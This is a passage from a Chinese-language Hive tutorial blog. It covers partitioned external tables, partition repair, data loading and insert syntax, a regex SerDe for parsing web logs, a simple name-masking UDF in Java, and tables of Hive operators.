class="keyword">create</span> <span class="keyword">external</span> <span class="keyword">table</span> psn_part</span><br><span class="line">(</span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">int</span>,</span><br><span class="line">    <span class="keyword">name</span> <span class="keyword">string</span>,</span><br><span class="line">    likes <span class="built_in">array</span>&lt;<span class="keyword">string</span>&gt;,</span><br><span class="line">    address <span class="keyword">map</span>&lt;<span class="keyword">string</span>,<span class="keyword">string</span>&gt;</span><br><span class="line">)</span><br><span class="line">partitioned <span class="keyword">by</span>(gender <span class="keyword">string</span>, age <span class="built_in">int</span>) <span class="comment">-- 定义多个分区，注意分区字段和普通字段不能重复。如产生目录 /data/hive/psn_part/gender=man/age=10</span></span><br><span class="line"><span class="keyword">row</span> <span class="keyword">format</span> <span class="keyword">delimited</span> <span class="comment">-- 自定义分隔符。默认分隔符`^A(\001)、^B(\002)、^C(\003)`，其中 ^A 等为特殊分割符(cat文件时不可见)，需使用 `Control + V + A` 进行输入</span></span><br><span class="line"><span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">','</span> <span class="comment">-- 字段分割符</span></span><br><span class="line">collection items <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">'-'</span> <span class="comment">-- 集合分隔符</span></span><br><span class="line"><span class="keyword">map</span> <span class="keyword">keys</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">':'</span> <span class="comment">-- map的key:value分隔符</span></span><br><span class="line">location <span class="string">'/data/hive/psn_part'</span>; <span class="comment">-- 数据保存的目录</span></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除表(如果为外部表则不会删除dfs数据)</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> psn_part;</span><br></pre></td></tr></table></figure><h4 id="修改表结构案例"><a href="#修改表结构案例" class="headerlink" title="修改表结构案例"></a>修改表结构案例</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--给分区表添加分区列的值。添加分区列的值的时候，如果定义的是多分区表，那么必须给所有的分区列都赋值</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> table_name <span class="keyword">add</span> <span class="keyword">partition</span>(col_name=col_value)</span><br><span class="line"><span class="comment">--删除分区列的值。删除分区列的值的时候，无论是单分区表还是多分区表，都可以将指定的分区进行删除</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> table_name <span class="keyword">drop</span> <span class="keyword">partition</span>(col_name=col_value)</span><br></pre></td></tr></table></figure><h4 id="修复分区使用"><a href="#修复分区使用" class="headerlink" title="修复分区使用"></a>修复分区使用</h4><ul><li>一般是先有数据文件，后创建的hive表，需要用到修复分区</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 在hdfs创建目录并上传文件</span></span><br><span class="line">hdfs dfs -mkdir /data</span><br><span class="line">hdfs dfs -mkdir /data/hive</span><br><span class="line">hdfs dfs -mkdir /data/hive/psn_part</span><br><span class="line">hdfs dfs -mkdir /data/hive/psn_part/age=10</span><br><span class="line">hdfs dfs -mkdir /data/hive/psn_part/age=20</span><br><span class="line"><span class="comment">-- 数据为：1,smalle,games-music,addr1:shanghai-add2:beijing</span></span><br><span class="line">hdfs dfs -put /home/test/data/psn_part_data_10 /data/hive/psn_part/age=10</span><br><span class="line"><span class="comment">-- 数据为</span></span><br><span class="line"><span class="comment">-- 2,test1,book-music1,addr1:guangzhou-add2:beijing</span></span><br><span class="line"><span class="comment">-- 3,test2,book-music2,addr1:guangzhou</span></span><br><span class="line">hdfs dfs -put /home/test/data/psn_part_data_20 /data/hive/psn_part/age=20</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 在hive中创建外部分区表</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">external</span> <span class="keyword">table</span> psn_part</span><br><span class="line">(</span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">int</span>,</span><br><span class="line">    <span class="keyword">name</span> <span class="keyword">string</span>,</span><br><span class="line">    likes <span class="built_in">array</span>&lt;<span class="keyword">string</span>&gt;,</span><br><span class="line">    address <span class="keyword">map</span>&lt;<span class="keyword">string</span>,<span class="keyword">string</span>&gt;</span><br><span class="line">)</span><br><span class="line">partitioned <span class="keyword">by</span>(age <span class="built_in">int</span>)</span><br><span class="line"><span class="keyword">row</span> <span class="keyword">format</span> <span class="keyword">delimited</span></span><br><span class="line"><span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">','</span></span><br><span class="line">collection items <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">'-'</span></span><br><span class="line"><span class="keyword">map</span> <span class="keyword">keys</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">':'</span></span><br><span class="line">location <span class="string">'/data/hive/psn_part'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--查询结果（没有数据）</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> psn_part;</span><br><span class="line"><span class="comment">--**修复分区**</span></span><br><span class="line">msck <span class="keyword">repair</span> <span class="keyword">table</span> psn_part;</span><br><span class="line"><span class="comment">--查询结果（有数据）</span></span><br><span class="line"><span class="comment">-- 1smalle["games","music"]&#123;"addr1":"shanghai","add2":"beijing"&#125;10</span></span><br><span class="line"><span class="comment">-- 2test1["book","music1"]&#123;"addr1":"guangzhou","add2":"beijing"&#125;20</span></span><br><span class="line"><span class="comment">-- 3test2["book","music2"]&#123;"addr1":"guangzhou"&#125;20</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> psn_part;</span><br></pre></td></tr></table></figure><h3 id="DML-数据操作"><a href="#DML-数据操作" class="headerlink" title="DML(数据操作)"></a>DML(数据操作)</h3><ul><li>数据更新和删除：在使用hive的过程中，我们一般不会产生删除和更新的操作</li></ul><h4 id="插入数据语法"><a href="#插入数据语法" class="headerlink" title="插入数据语法"></a>插入数据语法</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 1.Loading files into tables(导入数据)</span></span><br><span class="line"><span class="keyword">LOAD</span> <span class="keyword">DATA</span> [<span class="keyword">LOCAL</span>] INPATH <span class="string">'filepath'</span> [OVERWRITE] <span class="keyword">INTO</span> <span class="keyword">TABLE</span> tablename [<span class="keyword">PARTITION</span>(partcol1=val1, partcol2=val2 ...)]</span><br><span class="line"><span class="keyword">LOAD</span> <span class="keyword">DATA</span> [<span class="keyword">LOCAL</span>] INPATH <span class="string">'filepath'</span> [OVERWRITE] <span class="keyword">INTO</span> <span class="keyword">TABLE</span> tablename [<span class="keyword">PARTITION</span>(partcol1=val1, partcol2=val2 ...)] [INPUTFORMAT <span class="string">'inputformat'</span> SERDE <span class="string">'serde'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 2.Inserting data into Hive Tables from queries</span></span><br><span class="line"><span class="comment">-- 2.1 Standard syntax:</span></span><br><span class="line"><span class="keyword">INSERT</span> OVERWRITE <span class="keyword">TABLE</span> tablename1 [<span class="keyword">PARTITION</span> (partcol1=val1, partcol2=val2 ...) [<span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>]] select_statement1 <span class="keyword">FROM</span> from_statement;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">TABLE</span> tablename1 [<span class="keyword">PARTITION</span> (partcol1=val1, partcol2=val2 ...)] select_statement1 <span class="keyword">FROM</span> from_statement;</span><br><span class="line"><span class="comment">-- 2.2 Hive extension (multiple inserts):</span></span><br><span class="line">FROM from_statement</span><br><span class="line">    <span class="keyword">INSERT</span> OVERWRITE <span class="keyword">TABLE</span> tablename1 [<span class="keyword">PARTITION</span> (partcol1=val1, partcol2=val2 ...) [<span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>]] select_statement1</span><br><span class="line">    [<span class="keyword">INSERT</span> OVERWRITE <span class="keyword">TABLE</span> tablename2 [<span class="keyword">PARTITION</span> ... [<span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>]] select_statement2]</span><br><span class="line">    [<span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">TABLE</span> tablename2 [<span class="keyword">PARTITION</span> ...] select_statement2] ...;</span><br><span class="line">FROM from_statement</span><br><span class="line">    <span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">TABLE</span> tablename1 [<span class="keyword">PARTITION</span> (partcol1=val1, partcol2=val2 ...)] select_statement1</span><br><span class="line">    [<span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">TABLE</span> tablename2 [<span class="keyword">PARTITION</span> ...] select_statement2]</span><br><span class="line">    [<span class="keyword">INSERT</span> OVERWRITE <span class="keyword">TABLE</span> tablename2 [<span class="keyword">PARTITION</span> ... [<span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>]] select_statement2] ...;</span><br><span class="line"><span class="comment">-- 2.3 Hive extension (dynamic partition inserts):</span></span><br><span class="line"><span class="keyword">INSERT</span> OVERWRITE <span class="keyword">TABLE</span> tablename <span class="keyword">PARTITION</span> (partcol1[=val1], partcol2[=val2] ...) select_statement <span class="keyword">FROM</span> from_statement;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">TABLE</span> tablename <span class="keyword">PARTITION</span> (partcol1[=val1], partcol2[=val2] ...) select_statement <span class="keyword">FROM</span> from_statement;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 3.Writing data into the filesystem from queries</span></span><br><span class="line"><span class="comment">-- 3.1 Standard syntax:</span></span><br><span class="line"><span class="keyword">INSERT</span> OVERWRITE [<span class="keyword">LOCAL</span>] <span class="keyword">DIRECTORY</span> directory1</span><br><span class="line">[<span class="keyword">ROW</span> <span class="keyword">FORMAT</span> row_format] [<span class="keyword">STORED</span> <span class="keyword">AS</span> file_format] <span class="comment">-- (<span class="doctag">Note:</span> Only available starting with Hive 0.11.0)</span></span><br><span class="line"><span class="keyword">SELECT</span> ... <span class="keyword">FROM</span> ...</span><br><span class="line"><span class="comment">-- 3.2 Hive extension (multiple inserts):</span></span><br><span class="line"><span class="keyword">FROM</span> from_statement</span><br><span class="line">    <span class="keyword">INSERT</span> OVERWRITE [<span class="keyword">LOCAL</span>] <span class="keyword">DIRECTORY</span> directory1 select_statement1</span><br><span class="line">    [<span class="keyword">INSERT</span> OVERWRITE [<span class="keyword">LOCAL</span>] <span class="keyword">DIRECTORY</span> directory2 select_statement2] ... </span><br><span class="line">    row_format</span><br><span class="line">    : <span class="keyword">DELIMITED</span> [<span class="keyword">FIELDS</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="built_in">char</span> [<span class="keyword">ESCAPED</span> <span class="keyword">BY</span> <span class="built_in">char</span>]] [COLLECTION ITEMS <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="built_in">char</span>]</span><br><span class="line">    [<span class="keyword">MAP</span> <span class="keyword">KEYS</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="built_in">char</span>] [<span class="keyword">LINES</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="built_in">char</span>]</span><br><span class="line">    [<span class="literal">NULL</span> DEFINED <span class="keyword">AS</span> <span class="built_in">char</span>] <span class="comment">-- (<span class="doctag">Note:</span> Only available starting with Hive 0.13)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 4.Inserting values into tables from SQL(使用传统关系型数据库的方式插入数据，效率较低)</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="keyword">TABLE</span> tablename [<span class="keyword">PARTITION</span> (partcol1[=val1], partcol2[=val2] ...)] <span class="keyword">VALUES</span> values_row [, values_row ...]</span><br><span class="line"><span class="keyword">Where</span> values_row <span class="keyword">is</span>:</span><br><span class="line">( <span class="keyword">value</span> [, <span class="keyword">value</span> ...] )</span><br><span class="line"><span class="keyword">where</span> a <span class="keyword">value</span> <span class="keyword">is</span> either <span class="literal">null</span> <span class="keyword">or</span> <span class="keyword">any</span> valid <span class="keyword">SQL</span> literal</span><br></pre></td></tr></table></figure><h4 id="插入数据案例"><a href="#插入数据案例" class="headerlink" title="插入数据案例"></a>插入数据案例</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--**导入数据(使用较多)**</span></span><br><span class="line"><span class="comment">--加载本地数据到hive表（复制文件）</span></span><br><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">local</span> inpath <span class="string">'/home/test/data/psn_data'</span> <span class="keyword">into</span> <span class="keyword">table</span> psn;<span class="comment">--(/home/test/data/psn_data指的是本地linux目录)</span></span><br><span class="line"><span class="comment">--加载hdfs数据文件到hive表（移动文件）</span></span><br><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> inpath <span class="string">'/data/psn_data'</span> <span class="keyword">into</span> <span class="keyword">table</span> psn;<span class="comment">--(/data/psn_data指的是hdfs的目录)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--下面两种方式插入数据的时候需要预先创建好结果表</span></span><br><span class="line"><span class="comment">--**从表中查询数据插入结果表(使用较多)**</span></span><br><span class="line"><span class="keyword">insert</span> overwrite <span class="keyword">table</span> psn1</span><br><span class="line">    <span class="keyword">select</span> <span class="keyword">id</span>,<span class="keyword">name</span> <span class="keyword">from</span> psn;</span><br><span class="line"><span class="comment">--从表中获取部分列插入到新表中</span></span><br><span class="line">from psn</span><br><span class="line">    <span class="keyword">insert</span> overwrite <span class="keyword">table</span> psn1 <span class="comment">-- 将psn中的id,name字段覆盖psn1</span></span><br><span class="line">    <span class="keyword">select</span> <span class="keyword">id</span>,<span class="keyword">name</span></span><br><span class="line">    <span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span> psn2 <span class="comment">-- 将psn中的id字段追加到psn2                         </span></span><br><span class="line">    <span class="keyword">select</span> <span class="keyword">id</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--注意：overwrite为覆盖，路径千万不要填写根目录，会把所有的数据文件都覆盖</span></span><br><span class="line"><span class="comment">--将查询到的结果导入到hdfs文件系统中</span></span><br><span class="line"><span class="keyword">insert</span> overwrite <span class="keyword">directory</span> <span class="string">'/result'</span> <span class="keyword">select</span> * <span class="keyword">from</span> psn;</span><br><span class="line"><span class="comment">--将查询的结果导入到本地文件系统中</span></span><br><span class="line"><span class="keyword">insert</span> overwrite <span class="keyword">local</span> <span class="keyword">directory</span> <span class="string">'/result'</span> <span class="keyword">select</span> * <span class="keyword">from</span> psn;</span><br><span class="line"></span><br><span class="line"><span class="comment">--类似传统SQL语句一样插入数据(效率较低)</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> psn <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">'zhangsan'</span>)</span><br></pre></td></tr></table></figure><h3 id="Serde进行数据处理"><a href="#Serde进行数据处理" class="headerlink" title="Serde进行数据处理"></a>Serde进行数据处理</h3><ul><li>Hive Serde用来做序列化和反序列化，构建在数据存储和执行引擎之间，对两者实现解耦<ul><li>hive主要用来存储结构化数据，如果结构化数据存储的格式嵌套比较复杂的时候，可以使用serde的方式，如利用正则表达式匹配的方法来读取数据</li></ul></li><li>语法</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">row_format</span><br><span class="line">: DELIMITED </span><br><span class="line">    [FIELDS TERMINATED BY char [ESCAPED BY char]] </span><br><span class="line">    [COLLECTION ITEMS TERMINATED BY char] </span><br><span class="line">    [MAP KEYS TERMINATED BY char] </span><br><span class="line">    [LINES TERMINATED BY char] </span><br><span class="line"><span class="comment"># 如 serde_name=org.apache.hadoop.hive.serde2.RegexSerDe 表示使用正则进行数据处理</span></span><br><span class="line">: SERDE serde_name [WITH SERDEPROPERTIES (property_name=property_value, property_name=property_value, ...)]</span><br></pre></td></tr></table></figure><ul><li>案例</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 对于下列数据，希望数据显示的时候包含[]或者""</span></span><br><span class="line"><span class="comment"># /root/data/log文件如下</span></span><br><span class="line">192.168.57.4 - - [29/Feb/2019:18:14:35 +0800] <span class="string">"GET /bg-upper.png HTTP/1.1"</span> 304 -</span><br><span class="line">192.168.57.4 - - [29/Feb/2019:18:14:35 +0800] <span class="string">"GET /bg-nav.png HTTP/1.1"</span> 304 -</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建表</span></span><br><span class="line"><span class="comment"># org.apache.hadoop.hive.serde2.RegexSerDe：表示使用正则进行数据处理(类名，注意大小写)</span></span><br><span class="line"><span class="comment"># 正则表达式：([^ ]*) ([^ ]*) ([^ ]*) \\[(.*)\\] \"(.*)\" (-|[0-9]*) (-|[0-9]*)，前3个括号君表示匹配非空</span></span><br><span class="line">create table logtbl (</span><br><span class="line">    host string,</span><br><span class="line">    identity string,</span><br><span class="line">    t_user string,</span><br><span class="line">    time string,</span><br><span class="line">    request string,</span><br><span class="line">    referer string,</span><br><span class="line">    agent string</span><br><span class="line">)</span><br><span class="line">row format serde <span class="string">'org.apache.hadoop.hive.serde2.RegexSerDe'</span></span><br><span class="line">with serdeproperties (<span class="string">"input.regex"</span> = <span class="string">"([^ ]*) ([^ ]*) ([^ ]*) \\[(.*)\\] \"(.*)\" (-|[0-9]*) (-|[0-9]*)"</span>)</span><br><span class="line">stored as textfile;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载数据</span></span><br><span class="line">load data <span class="built_in">local</span> inpath <span class="string">'/home/test/data/logtbl'</span> into table logtbl;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询</span></span><br><span class="line">select * from logtbl;</span><br></pre></td></tr></table></figure><h3 id="Hive函数"><a href="#Hive函数" class="headerlink" title="Hive函数"></a>Hive函数</h3><ul><li>和关系型数据库差不多，hive内置了很多函数，如substr、count、explore等</li></ul><h4 id="自定义函数"><a href="#自定义函数" class="headerlink" title="自定义函数"></a>自定义函数</h4><ul><li>分类<ul><li><code>UDF</code>(User-Defined-Function): 一进一出</li><li><code>UDAF</code>(Aggregation): 聚合函数，多进一出，类似count/max/min</li><li><code>UDTF</code>(Table-Generating): 一进多出，如explore</li></ul></li><li>引用依赖</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">    无法下载pentaho-aggdesigner-algorithm-5.1.5-jhyde.jar，可手动下载后放到.m2相应目录</span></span><br><span class="line"><span class="comment">    下载地址：https://public.nexus.pentaho.org/repository/proxy-public-3rd-party-release/org/pentaho/pentaho-aggdesigner-algorithm/5.1.5-jhyde/pentaho-aggdesigner-algorithm-5.1.5-jhyde.jar</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hive<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hive-exec<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;hive.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>案例</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.apache.hadoop.hive.ql.exec.UDF</span></span><br><span class="line"><span class="comment">// org.apache.hadoop.io.Text</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TuoMin</span> <span class="keyword">extends</span> <span class="title">UDF</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 需要实现evaluate函数，evaluate函数支持重载</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Text <span class="title">evaluate</span><span class="params">(<span class="keyword">final</span> Text s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (s == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String str = s.toString().substring(<span class="number">0</span>, <span class="number">1</span>) + <span class="string">"***"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Text(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>使用<ul><li>把程序打包成jar上传到hdfs集群的/jar目录下：<code>hdfs dfs -D dfs.blocksize=1048576 -put bigdata-hive-0.0.1-SNAPSHOT.jar /jar</code></li><li>创建函数：hive&gt; <code>create function sq_tuomin as &#39;cn.aezo.bigdata.hive.func.TuoMin&#39; using jar &quot;hdfs://aezocn/jar/bigdata-hive-0.0.1-SNAPSHOT.jar&quot;;</code></li><li>查询HQL语句：<code>select sq_tuomin(name) from psn;</code> 返回<code>s***</code></li><li>销毁临时函数：hive&gt; <code>drop function sq_tuomin;</code></li></ul></li><li>临时使用：此种方式创建的函数属于临时函数，当关闭了当前会话之后，函数会无法使用，因为jar的引用没有了<ul><li>hive&gt; <code>add jar /home/test/bigdata-hive-0.0.1-SNAPSHOT.jar;</code> 在客户端执行，使用服务器本地目录(/home/test)</li><li>创建临时函数：hive&gt; <code>create temporary function sq_tuomin AS &#39;cn.aezo.bigdata.hive.func.TuoMin&#39;;</code></li></ul></li></ul><h4 id="1-内置运算符"><a href="#1-内置运算符" class="headerlink" title="1.内置运算符"></a>1.内置运算符</h4><h5 id="1-1关系运算符"><a href="#1-1关系运算符" class="headerlink" title="1.1关系运算符"></a>1.1关系运算符</h5><table><thead><tr><th>运算符</th><th>类型</th><th>说明</th></tr></thead><tbody><tr><td>A = B</td><td>所有原始类型</td><td>如果A与B相等,返回TRUE,否则返回FALSE</td></tr><tr><td>A == B</td><td>无</td><td>失败，因为无效的语法。 SQL使用”=”，不使用”==”。</td></tr><tr><td>A &lt;&gt; B</td><td>所有原始类型</td><td>如果A不等于B返回TRUE,否则返回FALSE。如果A或B值为”NULL”，结果返回”NULL”。</td></tr><tr><td>A &lt; B</td><td>所有原始类型</td><td>如果A小于B返回TRUE,否则返回FALSE。如果A或B值为”NULL”，结果返回”NULL”。</td></tr><tr><td>A &lt;= B</td><td>所有原始类型</td><td>如果A小于等于B返回TRUE,否则返回FALSE。如果A或B值为”NULL”，结果返回”NULL”。</td></tr><tr><td>A &gt; B</td><td>所有原始类型</td><td>如果A大于B返回TRUE,否则返回FALSE。如果A或B值为”NULL”，结果返回”NULL”。</td></tr><tr><td>A &gt;= B</td><td>所有原始类型</td><td>如果A大于等于B返回TRUE,否则返回FALSE。如果A或B值为”NULL”，结果返回”NULL”。</td></tr><tr><td>A IS NULL</td><td>所有类型</td><td>如果A值为”NULL”，返回TRUE,否则返回FALSE</td></tr><tr><td>A IS NOT NULL</td><td>所有类型</td><td>如果A值不为”NULL”，返回TRUE,否则返回FALSE</td></tr><tr><td>A LIKE B</td><td>字符串</td><td>如 果A或B值为”NULL”，结果返回”NULL”。字符串A与B通过sql进行匹配，如果相符返回TRUE，不符返回FALSE。B字符串中 的”<em>”代表任一字符，”%”则代表多个任意字符。例如： (‘foobar’ like ‘foo’)返回FALSE，（ ‘foobar’ like ‘foo</em> _ _’或者 ‘foobar’ like ‘foo%’)则返回TURE</td></tr><tr><td>A RLIKE B</td><td>字符串</td><td>如 果A或B值为”NULL”，结果返回”NULL”。字符串A与B通过java进行匹配，如果相符返回TRUE，不符返回FALSE。例如：（ ‘foobar’ rlike ‘foo’）返回FALSE，（’foobar’ rlike ‘^f.*r$’ ）返回TRUE。</td></tr><tr><td>A REGEXP B</td><td>字符串</td><td>与RLIKE相同。</td></tr></tbody></table><h5 id="1-2算术运算符"><a href="#1-2算术运算符" class="headerlink" title="1.2算术运算符"></a>1.2算术运算符</h5><table><thead><tr><th>运算符</th><th>类型</th><th>说明</th></tr></thead><tbody><tr><td>A + B</td><td>所有数字类型</td><td>A和B相加。结果的与操作数值有共同类型。例如每一个整数是一个浮点数，浮点数包含整数。所以，一个浮点数和一个整数相加结果也是一个浮点数。</td></tr><tr><td>A – B</td><td>所有数字类型</td><td>A和B相减。结果的与操作数值有共同类型。</td></tr><tr><td>A * B</td><td>所有数字类型</td><td>A和B相乘，结果的与操作数值有共同类型。需要说明的是，如果乘法造成溢出，将选择更高的类型。</td></tr><tr><td>A / B</td><td>所有数字类型</td><td>A和B相除，结果是一个double（双精度）类型的结果。</td></tr><tr><td>A % B</td><td>所有数字类型</td><td>A除以B余数与操作数值有共同类型。</td></tr><tr><td>A &amp; B</td><td>所有数字类型</td><td>运算符查看两个参数的二进制表示法的值，并执行按位”与”操作。两个表达式的一位均为1时，则结果的该位为 1。否则，结果的该位为 0。</td></tr><tr><td>A\</td><td>B</td><td>所有数字类型</td><td>运算符查看两个参数的二进制表示法的值，并执行按位”或”操作。只要任一表达式的一位为 1，则结果的该位为 1。否则，结果的该位为 0。</td></tr><tr><td>A ^ B</td><td>所有数字类型</td><td>运算符查看两个参数的二进制表示法的值，并执行按位”异或”操作。当且仅当只有一个表达式的某位上为 1 时，结果的该位才为 1。否则结果的该位为 0。</td></tr><tr><td>~A</td><td>所有数字类型</td><td>对一个表达式执行按位”非”（取反）。</td></tr></tbody></table><h5 id="1-3逻辑运算符"><a href="#1-3逻辑运算符" class="headerlink" title="1.3逻辑运算符"></a>1.3逻辑运算符</h5><table><thead><tr><th>运算符</th><th>类型</th><th>说明</th></tr></thead><tbody><tr><td>A AND B</td><td>布尔值</td><td>A和B同时正确时,返回TRUE,否则FALSE。如果A或B值为NULL，返回NULL。</td></tr><tr><td>A &amp;&amp; B</td><td>布尔值</td><td>与”A AND B”相同</td></tr><tr><td>A OR 